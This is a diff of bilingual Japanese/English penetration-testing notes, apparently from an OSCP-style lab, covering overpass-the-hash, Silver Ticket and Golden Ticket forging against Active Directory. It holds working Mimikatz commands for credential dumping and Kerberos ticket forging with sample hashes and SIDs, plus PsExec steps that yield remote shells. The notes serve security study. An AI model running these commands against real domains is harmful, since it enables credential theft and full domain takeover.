@@ -205,7 +205,9 @@ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2
 
 > overpass the hash テクニックの本質は、NTLM ハッシュを Kerberos チケットに変換し、 NTLM 認証を回避することにあります。これを行なう簡単な方法は、やはり Mimikatz の sekurlsa::pth コマンドです。
 
-Converting NTLM hash to TGT and get another user's shell. That user's hash can be got by `sekurlsa::logonpasswords`.
+Converting NTLM hash to TGT and get another user's shell. 
+
+(That user's hash can be got by `sekurlsa::logonpasswords`.)
 
 ```mimikatz# sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe ```
 
@@ -230,8 +232,53 @@ C:¥Windows¥system32>
 ```
 
 ## Pass The Ticket
+### Silver Ticket Crafting
+
+> 特定のアカウントとしてService Ticketを偽造し、当該アカウントになりすまして特定サービスを利用する。
+
+> 既に、サービスアカウントのパスワードハッシュをクラックし、サービスチケットからパス ワードを取得できることを示しました。このパスワードは、サービスアカウントで利用可能 なリソースにアクセスするために使用することができます。
+しかし、そのサービスアカウントがいずれかのサーバのローカル管理者でない場合、pass the hash や overpass the hash のようなベクターを使ってラテラルムーブメントを行うことがで きないため、別の方法を使う必要があります。
+
+> 
+例えば、サービスアカウント iis_service のコンテキストで実行されている IIS サーバに対 して認証を行うと、サービスチケットに存在するグループメンバーシップに応じて、IIS サ ーバでどの権限を持つかを IIS アプリケーションが決定します。
+しかし、サービスアカウントのパスワードまたはそれに関連する NTLM ハッシュがあれば、 独自のサービスチケットを作成し、ターゲットリソース(この例では IIS アプリケーション) に任意の権限でアクセスすることができます。このカスタムで作成したチケットは「シルバーチケット」と呼ばれる
+
+
+（シルバーチケットの生成には、平文のパスワードではなくパスワードハッシュを使用します。）
+
+
+```
+mimikatz # kerberos::purge
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+```
+
+It may be possible to execute command with Silver Ticket:
+
+```
+#0> client: ...
+    server: cifs/WIN2008R2.pentest.local@PENTEST.LOCAL
+```
+
+の場合
+
+```
+C:\> PsExec.exe \\win2008r2 whoami
+```
+
+(how to find SID)
+
+```
+C:¥>whoami /user
+USER INFORMATION
+----------------
+User Name SID
+=========== ============================================== 
+corp¥offsec S-1-5-21-1602875587-2787523311-2599479668-1103
+```
+
+
 ### Golden Ticket Crafting
-I make the original TGT namely **Golden Ticket**. <u>This need krbtgt's hash</u>.
+I make the original TGT namely **Golden Ticket**. *This need krbtgt's hash*.
 
 Get the krbtgt's hash:
 
@@ -267,24 +314,4 @@ mimikatz # misc::cmd
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 012E3A24
 C:¥Users¥offsec.crop> psexec.exe ¥¥dc01 cmd.exe
 PsExec v2.2 - Execute processes remotely Copyright (C) 2001-2016 Mark Russinovich Sysinternals - www.sysinternals.com C:¥Windows¥system32> 
-```
-
-### Silver Ticket Crafting
-
-(This may be not able to get the shell, but you can access to some services (SPN) with high privilege.)
-
-```
-mimikatz # kerberos::purge
-mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587- 2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
-```
-
-[*] how to find SID:
-
-```
-C:¥>whoami /user
-USER INFORMATION
-----------------
-User Name SID
-=========== ============================================== 
-corp¥offsec S-1-5-21-1602875587-2787523311-2599479668-1103
 ```
